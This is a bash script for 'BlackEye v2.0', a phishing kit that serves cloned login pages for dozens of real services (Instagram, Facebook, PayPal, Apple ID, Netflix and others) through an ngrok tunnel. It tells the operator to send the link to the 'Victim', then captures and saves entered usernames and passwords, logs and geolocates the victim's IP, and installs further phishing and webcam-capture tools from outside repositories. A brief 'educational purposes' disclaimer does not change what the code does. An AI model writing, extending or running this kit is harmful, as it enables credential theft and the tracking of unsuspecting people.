#!/bin/bash
# Coloring
BC='\e[1;92m[\e[0m\e[1;77m'
AC='\e[0m\e[1;92m]\e[0m\e[1;91m'
NC='\e[0m'
GRN='\033[1;92m'
W='\033[1;37m'

# TrapControl
trap 'printf "\n";stop;exit 1' 2

# Dependancy Check
dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
  command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
  command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
  command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
}

# Option Menu
menu(){
  echo -e "          ${BC}01${AC} Instagram ${NC}       ${BC}17${AC} DropBox ${NC}        ${BC}33${AC} eBay ${NC}"
  echo -e "          ${BC}02${AC} FaceBook ${NC}        ${BC}18${AC} Adobe ID ${NC}       ${BC}34${AC} Amazon ${NC}"
  echo -e "          ${BC}03${AC} SnapChat ${NC}        ${BC}19${AC} Shopify ${NC}        ${BC}35${AC} iCloud ${NC}"
  echo -e "          ${BC}04${AC} Twitter ${NC}         ${BC}20${AC} Messenger ${NC}      ${BC}36${AC} Spotify ${NC}"
  echo -e "          ${BC}05${AC} Github ${NC}          ${BC}21${AC} GitLab ${NC}         ${BC}37${AC} Netflix ${NC}"
  echo -e "          ${BC}06${AC} Google ${NC}          ${BC}22${AC} Twitch ${NC}         ${BC}38${AC} Custom ${NC}"
  echo -e "          ${BC}07${AC} Origin ${NC}          ${BC}23${AC} MySpace ${NC}        ${BC}**${AC} Extra Tools ${NC}"
  echo -e "          ${BC}08${AC} Yahoo ${NC}           ${BC}24${AC} Badoo ${NC}          ${BC}39${AC} CamPhish ${NC}"
  echo -e "          ${BC}09${AC} LinkedIn ${NC}        ${BC}25${AC} VK ${NC}             ${BC}40${AC} LostPass ${NC}"
  echo -e "          ${BC}10${AC} Protonmail ${NC}      ${BC}26${AC} Yandex ${NC}         ${BC}41${AC} PhishMailer ${NC}"
  echo -e "          ${BC}11${AC} Wordpress ${NC}       ${BC}27${AC} DevianART ${NC}      ${BC}42${AC} HackerPro ${NC}"
  echo -e "          ${BC}12${AC} Microsoft ${NC}       ${BC}28${AC} Wi-Fi ${NC}      "       #${BC}01${AC} ?? ${NC}
  echo -e "          ${BC}13${AC} IGFollowers ${NC}     ${BC}29${AC} PayPal ${NC}      "      #${BC}01${AC} ?? ${NC}
  echo -e "          ${BC}14${AC} Pinterest ${NC}       ${BC}30${AC} Steam ${NC}      "       #${BC}01${AC} ?? ${NC}
  echo -e "          ${BC}15${AC} Apple ID ${NC}        ${BC}31${AC} Bitcoin ${NC}      "     #${BC}01${AC} ?? ${NC}
  echo -e "          ${BC}16${AC} Verizon ${NC}         ${BC}32${AC} Playstation ${NC}      " #${BC}01${AC} ?? ${NC}

  read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option

  # Ngrok Auth Validation
  if [[ ! -f 'ngrok' ]]; then
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
    unzip ngrok-stable-linux-amd64.zip
    rm ngrok-stable-linux-amd64.zip
  fi
  # If .token file not found indicating ngrok auth token has been given
  # Asks user for authtoken and runs auth process
  # If all checks are passed this section silently runs through
  if [[ ! -f '.token' ]]; then
    echo -n "Please enter your Ngrok Auth Token: "
    read TOKEN
    ./ngrok authtoken ${TOKEN}
    echo '1' > .token
  fi

  if [[ ${option} == 1 ]]; then
    server="instagram"
    start

  elif [[ ${option} == 2 ]]; then
    server="facebook"
    start

  elif [[ ${option} == 3 ]]; then
    server="snapchat"
    start

  elif [[ ${option} == 4 ]]; then
    server="twitter"
    start

  elif [[ ${option} == 5 ]]; then
    server="github"
    start
  elif [[ ${option} == 6 ]]; then
    server="google"
    start

  elif [[ ${option} == 7 ]]; then
    server="origin"
    start

  elif [[ ${option} == 8 ]]; then
    server="yahoo"
    start

  elif [[ ${option} == 9 ]]; then
    server="linkedin"
    start

  elif [[ ${option} == 10 ]]; then
    server="protonmail"
    start

  elif [[ ${option} == 11 ]]; then
    server="wordpress"
    start

  elif [[ ${option} == 12 ]]; then
    server="microsoft"
    start

  elif [[ ${option} == 13 ]]; then
    server="instafollowers"
    start

  elif [[ ${option} == 14 ]]; then
    server="pinterest"
    start

  elif [[ ${option} == 15 ]]; then
    server="apple"
    start

  elif [[ ${option} == 16 ]]; then
    server="verizon"
    start

  elif [[ ${option} == 17 ]]; then
    server="dropbox"
    start

  elif [[ ${option} == 18 ]]; then
    server="adobe"
    start

  elif [[ ${option} == 19 ]]; then
    server="shopify"
    start

  elif [[ ${option} == 20 ]]; then
    server="messenger"
    start

  elif [[ ${option} == 21 ]]; then
    server="gitlab"
    start

  elif [[ ${option} == 22 ]]; then
    server="twitch"
    start

  elif [[ ${option} == 23 ]]; then
    server="myspace"
    start

  elif [[ ${option} == 24 ]]; then
    server="badoo"
    start

  elif [[ ${option} == 25 ]]; then
    server="vk"
    start

  elif [[ ${option} == 26 ]]; then
    server="yandex"
    start

  elif [[ ${option} == 27 ]]; then
    server="devianart"
    start

  elif [[ ${option} == 28 ]]; then
    server="wifi"
    start

  elif [[ ${option} == 29 ]]; then
    server="paypal"
    start

  elif [[ ${option} == 30 ]]; then
    server="steam"
    start

  elif [[ ${option} == 31 ]]; then
    server="bitcoin"
    start

  elif [[ ${option} == 32 ]]; then
    server="playstation"
    start

  elif [[ ${option} == 33 ]]; then
    server="shopping"
    start

  elif [[ ${option} == 34 ]]; then
    server="amazon"
    start

  elif [[ ${option} == 35 ]]; then
    server="icloud"
    start

  elif [[ ${option} == 36 ]]; then
    server="spotify"
    start

  elif [[ ${option} == 37 ]]; then
    server="netflix"
    start

  elif [[ ${option} == 38 ]]; then
    server="create"
    createpage
    start
  # End of internal Phish pages.

  # Start of External tools.
  elif [[ ${option} == 39 ]]; then
      if [[ ! -d 'sites/CamPhish' ]]; then
        echo "Installing CamPhish"
        git clone https://github.com/techchipnet/CamPhish sites/CamPhish
      fi
      cd sites/CamPhish
      bash camphish.sh

  elif [[ ${option} == 40 ]]; then
      # xTerm needed to make the process more automated for user
      if [[ ! -d 'sites/lostpass' ]]; then
        echo "Installing LostPass"
        git clone https://github.com/cxxr/lostpass sites/lostpass
        cd sites/lostpass
        sudo apt-get install nodejs npm virtualenv
        sudo npm install -g grunt-cli
        sudo npm install
        python2 -m virtualenv env
        ./env/bin/python -m pip install lastpass-python bottle
      fi
      xterm -e sudo grunt
      cd chrome4/
      ./env/bin/python server.py

  elif [[ ${option} == 41 ]]; then
    # Install PhishMailer if needed
    if [[ ! -d 'sites/PhishMailer' ]]; then
      git clone https://github.com/BiZken/PhishMailer sites/PhishMailer
    fi
    cd sites/PhishMailer
    # If there are permission errors starting this - append sudo to --
    python3 PhishMailer.py                     # This command <-------'

  elif [[ ${option} == 42 ]]; then
    # Install HackerPro if needed.
    if [[ ! -d 'sites/hackerpro' ]]; then
      git clone https://github.com/jaykali/hackerpro sites/hackerpro
      cd hackerpro
      sudo bash install.sh
    fi
    sudo python2 hackerpro.py

  else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    menu
  fi
}

##############################################################

stop(){
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi
  if [[ $checkphp == *'php'* ]]; then
    pkill -f -2 php > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1
  fi
}

##############################################################

banner(){
  printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
  printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
  printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
  printf "\n"
  printf "     \e[101m\e[1;77m::     BLACKEYE v2.0! By @j-dogcoder    ::\e[0m\n"
  printf "\n"
}

##############################################################

createpage(){
  default_cap1="Wi-fi Session Expired"
  default_cap2="Please login again."
  default_user_text="Username:"
  default_pass_text="Password:"
  default_sub_text="Log-In"

  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
  cap1="${cap1:-${default_cap1}}"

  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
  cap2="${cap2:-${default_cap2}}"

  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
  user_text="${user_text:-${default_user_text}}"

  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
  pass_text="${pass_text:-${default_pass_text}}"

  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
  sub_text="${sub_text:-${default_sub_text}}"

  echo "<!DOCTYPE html>" > sites/create/login.html
  echo "<html>" >> sites/create/login.html
  echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
  IFS=$'\n'
  printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
  IFS=$'\n'
  printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
  IFS=$'\n'
  printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
  IFS=$'\n'
  printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
  IFS=$'\n'
  printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
  IFS=$'\n'
  printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
  printf '</center>' >> sites/create/login.html
  printf '<body>\n' >> sites/create/login.html
  printf '</html>\n' >> sites/create/login.html
}

##############################################################

catch_cred(){
  account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
  IFS=$'\n'
  password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
  cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
  killall -2 php > /dev/null 2>&1
  killall -2 ngrok > /dev/null 2>&1
  exit 1
}

##############################################################

getcredentials(){
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials ...\e[0m\n"
  while [ true ]; do
    if [[ -e "sites/$server/usernames.txt" ]]; then
      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
      catch_cred
    fi
    sleep 1
  done
}

##############################################################

catch_ip(){
  touch sites/$server/saved.usernames.txt
  ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
  cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


  if [[ -e iptracker.log ]]; then
    rm -rf iptracker.log
  fi

  IFS='\n'
  iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
  IFS=$'\n'
  continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
  printf "\n"
  hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
  if [[ $hostnameip != "" ]]; then
    printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
  fi
  ##

  reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
  if [[ $reverse_dns != "" ]]; then
    printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
  fi
  ##

  if [[ $continent != "" ]]; then
    printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
  fi
  ##

  country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
  if [[ $country != "" ]]; then
    printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
  fi
  ##

  state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
  if [[ $state != "" ]]; then
    printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
  fi
  ##
  city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

  if [[ $city != "" ]]; then
    printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
  fi
  ##

  isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
  if [[ $isp != "" ]]; then
    printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
  fi
  ##

  as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
  if [[ $as_number != "" ]]; then
    printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
  fi
  ##

  ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
  if [[ $ip_speed != "" ]]; then
    printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
  fi
  ##
  ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

  if [[ $ip_currency != "" ]]; then
    printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
  fi
  ##
  printf "\n"
  rm -rf iptracker.log

  getcredentials
}

##############################################################

checkfound(){
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for the victim to open the link ...\e[0m\n"
  while [ true ]; do
    if [[ -e "sites/$server/ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
      catch_ip

    fi
    sleep 1
  done
}

##############################################################

start(){
  if [[ -e sites/$server/ip.txt ]]; then
      rm -rf sites/$server/ip.txt
  fi
  ##
  if [[ -e sites/$server/usernames.txt ]]; then
    rm -rf sites/$server/usernames.txt
  fi

  printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
  cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
  ./ngrok http 3333 > /dev/null 2>&1 &
  sleep 10

  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
  printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
  checkfound
}

##############################################################

# Runtime
banner
dependencies
menu
